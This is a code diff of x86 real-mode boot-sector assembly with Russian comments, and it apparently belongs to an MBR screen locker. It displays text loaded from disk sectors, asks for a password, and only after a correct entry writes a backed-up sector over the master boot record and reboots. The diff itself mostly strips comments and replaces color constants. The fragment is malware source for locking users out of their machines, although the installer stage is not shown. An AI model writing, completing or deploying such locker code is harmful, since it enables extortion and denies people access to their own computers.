@@ -11,18 +11,19 @@ start:
     mov sp, 0x7C00
     sti
 
-    ; === НАСТРОЙКА ЭКРАНА ===
     mov ax, 0x0003
     int 0x10
 
     mov ah, 0x06
     mov al, 0
-    mov bh, COLOR_BG
+    mov bh, 0x00
     mov cx, 0
     mov dx, 0x184F
     int 0x10
 
-    ; === ЗАГРУЗКА ШРИФТА CP866 ===
+    ; ============================================================
+    ; ЗАГРУЗКА ШРИФТА CP866 (СЕКТОРЫ 3-10)
+    ; ============================================================
     mov ax, 0x0000
     mov es, ax
     mov bx, 0x1000
@@ -39,7 +40,9 @@ start:
     mov bx, 0x0100
     int 0x10
 
-    ; === ЗАГРУЗКА И ВЫВОД ЗАГОЛОВКА ===
+    ; ============================================================
+    ; ЗАГРУЗКА ЗАГОЛОВКА (СЕКТОР 11)
+    ; ============================================================
     mov ax, 0x0000
     mov es, ax
     mov bx, 0x9000
@@ -55,7 +58,9 @@ start:
     mov si, 0x9000
     call print
 
-    ; === ЗАГРУЗКА И ВЫВОД ТЕКСТА ===
+    ; ============================================================
+    ; ЗАГРУЗКА ТЕКСТА (СЕКТОР 12)
+    ; ============================================================
     mov ax, 0x0000
     mov es, ax
     mov bx, 0x9200
@@ -71,7 +76,9 @@ start:
     mov si, 0x9200
     call print
 
-    ; === ПРИГЛАШЕНИЕ ПАРОЛЯ ===
+    ; ============================================================
+    ; КУРСОР ВНИЗ И ВЫВОД "Password: "
+    ; ============================================================
     mov ah, 0x02
     mov bh, 0
     mov dh, 24
@@ -90,7 +97,6 @@ password_loop:
     mov si, msg_wrong
     call print
 
-    ; ВОЗВРАТ КУРСОРА
     mov ah, 0x02
     mov bh, 0
     mov dh, 24
@@ -106,9 +112,8 @@ load_error:
 
 restore_and_boot:
     call restore_mbr
-    int 0x19          ; ПЕРЕЗАГРУЗКА
+    int 0x19
 
-; === ВОССТАНОВЛЕНИЕ MBR ===
 restore_mbr:
     pusha
     mov ax, 0x0000
@@ -117,7 +122,7 @@ restore_mbr:
     mov ah, 0x02
     mov al, 1
     mov ch, 0
-    mov cl, 3          ; ЧИТАЕМ БЭКАП ИЗ СЕКТОРА 2 (LBA 2)
+    mov cl, 3
     mov dh, 0
     mov dl, 0x80
     int 0x13
@@ -129,7 +134,7 @@ restore_mbr:
     mov ah, 0x03
     mov al, 1
     mov ch, 0
-    mov cl, 1          ; ПИШЕМ В СЕКТОР 0 (LBA 0)
+    mov cl, 1
     mov dh, 0
     mov dl, 0x80
     int 0x13
@@ -137,20 +142,18 @@ restore_mbr:
     popa
     ret
 
-; === ПЕЧАТЬ СТРОКИ ===
 print:
     lodsb
     or al, al
     jz .done
     mov ah, 0x0E
     mov bh, 0x00
-    mov bl, COLOR_FG
+    mov bl, 0x07
     int 0x10
     jmp print
 .done:
     ret
 
-; === ВВОД ПАРОЛЯ ===
 get_password:
     mov di, buffer
 .loop:
@@ -167,7 +170,7 @@ get_password:
     stosb
     mov ah, 0x0E
     mov bh, 0x00
-    mov bl, COLOR_FG
+    mov bl, 0x07
     mov al, [di - 1]
     int 0x10
     jmp .loop
@@ -177,7 +180,7 @@ get_password:
     dec di
     mov ah, 0x0E
     mov bh, 0x00
-    mov bl, COLOR_FG
+    mov bl, 0x07
     mov al, 0x08
     int 0x10
     mov al, ' '
@@ -189,14 +192,13 @@ get_password:
     mov byte [di], 0
     mov ah, 0x0E
     mov bh, 0x00
-    mov bl, COLOR_FG
+    mov bl, 0x07
     mov al, 0x0A
     int 0x10
     mov al, 0x0D
     int 0x10
     ret
 
-; === ПРОВЕРКА ПАРОЛЯ ===
 check_password:
     mov si, buffer
     mov di, password
